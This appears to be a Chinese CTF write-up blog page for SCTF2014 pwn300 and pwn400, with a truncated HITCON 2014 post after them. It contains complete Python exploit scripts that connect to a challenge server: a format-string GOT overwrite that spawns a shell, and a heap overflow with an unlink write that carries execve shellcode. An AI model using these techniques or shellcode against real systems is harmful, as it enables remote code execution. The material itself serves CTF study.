<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line">SCTF2014 pwn300 exploit</div><div class="line">yuf4n</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">\<span class="comment"># io = zio('./pwn300',print_write=COLORED(REPR))</span></div><div class="line">io = zio((<span class="string">'218.2.197.248'</span>,<span class="number">10002</span>),print_write=COLORED(REPR))</div><div class="line"></div><div class="line">memset\_plt\_addr = <span class="number">0x08049130</span></div><div class="line">p = FormatStr()</div><div class="line">payload\_leak\_lib_main = <span class="string">'x28x91x04x08%7$sn'</span></div><div class="line"></div><div class="line">\<span class="comment"># read \_\_lib\_main_start plt</span></div><div class="line">io.read_until(<span class="string">'your choice:'</span>)</div><div class="line">io.write(<span class="string">'2n'</span>)</div><div class="line">io.read_until(<span class="string">'your message'</span>)</div><div class="line">io.write(payload\_leak\_lib_main)</div><div class="line">io.read_until(<span class="string">'your choice:'</span>)</div><div class="line">io.write(<span class="string">'3n'</span>)</div><div class="line">io.read_until(<span class="string">'message is:'</span>)</div><div class="line">buf = io.read(<span class="number">8</span>)</div><div class="line">buf = buf\[<span class="number">-4</span>:\]</div><div class="line">systemaddr = struct.unpack(<span class="string">'&lt;I'</span>,buf)\[<span class="number">0</span>\] + <span class="number">0x26050</span></div><div class="line"><span class="keyword">print</span> <span class="string">'SYSADDR'</span>,hex(systemaddr)</div><div class="line"></div><div class="line">\<span class="comment"># write  memset_plt</span></div><div class="line">p\[memset\_plt\_addr\] = systemaddr</div><div class="line">payload = p.payload(<span class="number">7</span>, start_len=<span class="number">0</span>) + <span class="string">'n'</span></div><div class="line">\<span class="comment"># io.gdb_hint()</span></div><div class="line">io.read_until(<span class="string">'your choice:'</span>)</div><div class="line">io.write(<span class="string">'2n'</span>)</div><div class="line">io.read_until(<span class="string">'your message'</span>)</div><div class="line">io.write(payload)</div><div class="line">io.write(<span class="string">'3n'</span>)</div><div class="line"></div><div class="line">\<span class="comment"># set src=sh and call memset</span></div><div class="line">io.read_until(<span class="string">'your choice:'</span>)</div><div class="line">io.write(<span class="string">'2n'</span>)</div><div class="line">io.read_until(<span class="string">'message'</span>)</div><div class="line">io.write(<span class="string">'shn'</span>)</div><div class="line">io.read_until(<span class="string">'your choice:'</span>)</div><div class="line">io.write(<span class="string">'2n'</span>)</div><div class="line">io.read_until(<span class="string">'message'</span>)</div><div class="line">io.write(<span class="string">'shn'</span>)</div><div class="line"></div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<p>flag SCTF{ZQzq2617}</p>
<h1 id="PWN400"><a href="#PWN400" class="headerlink" title="PWN400"></a>PWN400</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pwn400: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26</div><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</div><div class="line">No RELRO        Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   pwn400</div></pre></td></tr></table></figure>
<p>这个NX都没有。</p>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序是一个类似便签的功能。 每个note是用malloc申请的，用双向链表链接起来，目测是某个同学的C语言小作业吧。。 3号功能可以显示note空间的的首地址。 在4号功能修改note的功能发现一个堆溢出的漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> \_\_cdecl fun4\_sub_8048D09(<span class="keyword">int</span> a1)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax@4</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@8</span></div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// \[sp+28h\] \[bp-410h\]@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// \[sp+2Ch\] \[bp-40Ch\]@1</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+42Ch\] \[bp-Ch\]@1</span></div><div class="line"></div><div class="line">  v5 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x400</span>u);</div><div class="line">  v3 = a1;</div><div class="line">  <span class="keyword">if</span> ( a1 )</div><div class="line">  &#123;</div><div class="line">    write(<span class="number">1</span>, <span class="string">"note title:"</span>, <span class="number">0xB</span>u);</div><div class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>u);</div><div class="line">    <span class="keyword">while</span> ( v3 )</div><div class="line">    &#123;</div><div class="line">      v1 = <span class="built_in">strlen</span>(&amp;buf);</div><div class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v3 + <span class="number">12</span>), v1) )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      v3 = *(_DWORD *)(v3 + <span class="number">8</span>);</div><div class="line">    &#125;</div><div class="line">    write(<span class="number">1</span>, <span class="string">"input content:"</span>, <span class="number">0xE</span>u);</div><div class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>u);</div><div class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(v3 + <span class="number">108</span>), &amp;buf);           <span class="comment">// exploit</span></div><div class="line">    write(<span class="number">1</span>, <span class="string">"succeed!"</span>, <span class="number">8u</span>);</div><div class="line">    <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(v3 + <span class="number">108</span>));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    write(<span class="number">1</span>, <span class="string">"no notes"</span>, <span class="number">8u</span>);</div><div class="line">  &#125;</div><div class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v5;</div><div class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v5 )</div><div class="line">    \_\_stack\_chk_fail();</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在5号功能删除note的功能发现一个类似dwrod shoot的漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> \_\_cdecl sub\_8048E99(<span class="keyword">int</span> a1)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST28_4@8</span></div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST2C_4@8</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@10</span></div><div class="line">  __int32 ptr; <span class="comment">// \[sp+24h\] \[bp-24h\]@3</span></div><div class="line">  <span class="keyword">int</span> buf; <span class="comment">// \[sp+32h\] \[bp-16h\]@1</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// \[sp+36h\] \[bp-12h\]@1</span></div><div class="line">  __int16 v7; <span class="comment">// \[sp+3Ah\] \[bp-Eh\]@1</span></div><div class="line">  <span class="keyword">int</span> v8; <span class="comment">// \[sp+3Ch\] \[bp-Ch\]@1</span></div><div class="line"></div><div class="line">  v8 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</div><div class="line">  buf = <span class="number">0</span>;</div><div class="line">  v6 = <span class="number">0</span>;</div><div class="line">  v7 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 )</div><div class="line">  &#123;</div><div class="line">    write(<span class="number">1</span>, <span class="string">"note location:"</span>, <span class="number">0xE</span>u);</div><div class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</div><div class="line">    ptr = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">0</span>, <span class="number">16</span>);</div><div class="line">    <span class="keyword">if</span> ( *(_DWORD *)ptr == ptr )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( *(_DWORD *)a1 == ptr )</div><div class="line">      &#123;</div><div class="line">        *(\_DWORD *)a1 = *(\_DWORD *)(*(_DWORD *)a1 + <span class="number">8</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( *(_DWORD *)(ptr + <span class="number">8</span>) )</div><div class="line">        &#123;</div><div class="line">          v1 = *(_DWORD *)(ptr + <span class="number">8</span>);</div><div class="line">          v2 = *(_DWORD *)(ptr + <span class="number">4</span>);</div><div class="line">          *(_DWORD *)(v2 + <span class="number">8</span>) = v1;             <span class="comment">// dword shoot</span></div><div class="line">          *(_DWORD *)(v1 + <span class="number">4</span>) = v2;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">          *(\_DWORD *)(*(\_DWORD *)(ptr + <span class="number">4</span>) + <span class="number">8</span>) = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      write(<span class="number">1</span>, <span class="string">"succeed!nn"</span>, <span class="number">0xA</span>u);</div><div class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    write(<span class="number">1</span>, <span class="string">"no notes"</span>, <span class="number">8u</span>);</div><div class="line">  &#125;</div><div class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v8;</div><div class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v8 )</div><div class="line">    \_\_stack\_chk_fail();</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>例如ptr = &amp;note (note空间的基地址) 则可以进行 [ [ptr+4]+8 ] = [prt+8] [ [ptr+8]+4 ] = [ptr+4]</p>
<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>思路是通过堆溢出漏洞可以覆盖到另外一个note的ptr+4 和 ptr+8。 之后利用这个dword shoot修改即将要调用的函数的plt到shellcode处。 shellcode前面要加一些nop，因为dword shoot的副作用会修改到shellcode。 具体操作：</p>
<ol>
<li>新建3个note，我把shellcode放在第三个note的content里</li>
<li>查看他们的地址</li>
<li>溢出第一个note</li>
<li>删除第二个note，通过dword shoot修改write函数的plt为shellcode位置（有试过修改其他函数的，发现修改write可以成功。）</li>
<li>程序在dword shoot之后就有一个write调用，即进入shellcode</li>
</ol>
<p>exploit如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line">SCTF2014 pwn400 exploit</div><div class="line">yuf4n</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">\<span class="comment"># io = zio('./pwn400', print_write=COLORED(REPR), timeout=80000)</span></div><div class="line">io = zio((<span class="string">'218.2.197.248'</span>,<span class="number">10003</span>),print_write=COLORED(REPR))</div><div class="line">exit_plt = <span class="number">0x0804A46C</span></div><div class="line">free_plt =<span class="number">0x0804A450</span></div><div class="line">write_plt =<span class="number">0x0804A478</span></div><div class="line">shellcode = <span class="string">"x90"</span>*<span class="number">16</span>+<span class="string">"x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"</span></div><div class="line"></div><div class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">io.write(<span class="string">'1n'</span>)</div><div class="line">io.read_until(<span class="string">'note title:'</span>)</div><div class="line">io.write(<span class="string">'1n'</span>)</div><div class="line">io.read_until(<span class="string">'note type:'</span>)</div><div class="line">io.write(<span class="string">'1n'</span>)</div><div class="line">io.read_until(<span class="string">'note content:'</span>)</div><div class="line">io.write(<span class="string">'1n'</span>)</div><div class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line"></div><div class="line">io.write(<span class="string">'1n'</span>)</div><div class="line">io.read_until(<span class="string">'note title:'</span>)</div><div class="line">io.write(<span class="string">'2n'</span>)</div><div class="line">io.read_until(<span class="string">'note type:'</span>)</div><div class="line">io.write(<span class="string">'2n'</span>)</div><div class="line">io.read_until(<span class="string">'note content:'</span>)</div><div class="line">io.write(<span class="string">'2n'</span>)</div><div class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line"></div><div class="line">io.write(<span class="string">'1n'</span>)</div><div class="line">io.read_until(<span class="string">'note title:'</span>)</div><div class="line">io.write(<span class="string">'3n'</span>)</div><div class="line">io.read_until(<span class="string">'note type:'</span>)</div><div class="line">io.write(<span class="string">'3n'</span>)</div><div class="line">io.read_until(<span class="string">'note content:'</span>)</div><div class="line">io.write(shellcode+<span class="string">'n'</span>)</div><div class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line"></div><div class="line">io.write(<span class="string">'3n'</span>)</div><div class="line">io.read_until(<span class="string">'note title:'</span>)</div><div class="line">io.write(<span class="string">'3n'</span>)</div><div class="line">buf = io.read_until(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">addr_3 = buf\[buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>):buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>)+<span class="number">8</span>\]</div><div class="line"></div><div class="line">io.write(<span class="string">'3n'</span>)</div><div class="line">io.read_until(<span class="string">'note title:'</span>)</div><div class="line">io.write(<span class="string">'2n'</span>)</div><div class="line">buf = io.read_until(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">addr_2 = buf\[buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>):buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>)+<span class="number">8</span>\]</div><div class="line"></div><div class="line">payload = <span class="string">'1'</span>*<span class="number">0x100</span></div><div class="line">payload += <span class="string">'2222'</span></div><div class="line">\<span class="comment"># addr2</span></div><div class="line">payload += l32(int(addr_2,<span class="number">16</span>))</div><div class="line">\<span class="comment"># ptr+4</span></div><div class="line">payload += l32(write_plt<span class="number">-0x8</span>)</div><div class="line">\<span class="comment"># ptr+8</span></div><div class="line">payload += l32(int(addr_3,<span class="number">16</span>)+<span class="number">108</span>)</div><div class="line">payload += <span class="string">'efghijklmn'</span></div><div class="line"></div><div class="line">io.write(<span class="string">'4n'</span>)</div><div class="line">io.read_until(<span class="string">'title:'</span>)</div><div class="line">io.write(<span class="string">'1n'</span>)</div><div class="line">io.read_until(<span class="string">'content:'</span>)</div><div class="line">io.write(payload+<span class="string">'n'</span>)</div><div class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line"></div><div class="line">io.write(<span class="string">'5n'</span>)</div><div class="line">\<span class="comment"># io.gdb_hint()</span></div><div class="line">io.read_until(<span class="string">'location:'</span>)</div><div class="line">io.write(addr_2+<span class="string">'n'</span>)</div><div class="line"></div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<p>flag SCTF{2318540E78446A0E84EF69685092F0C3}</p>

                    
                        
                    
                    
                        <p>
                            <a href="/writeups/sctf2014-pwn-writeups/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/writeups/hitcon-ctf-2014-rsbo-finger-rsaha-writeup/">
                            HITCON CTF 2014 rsbo,finger,rsaha writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2014-09-04T14:45:12+08:00">
	
		    Sep 04, 2014
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h1 id="0x01-rsbo"><a href="#0x01-rsbo" class="headerlink" title="0x01 rsbo"></a>0x01 rsbo</h1><p>ELF 32-bit LSB  executable 栈有随机化且不能执行 静态分析程序,有调试信息 read_80_bytes能读入0x80即128bytes到&amp;v2，造成栈溢出 但输入后会进行一个混淆，所以使用0输入前0x60位，可覆盖过变量v5的位置，当随机替换v5处值与之前的0时即可退出循环 <img src="data:image/png;base64,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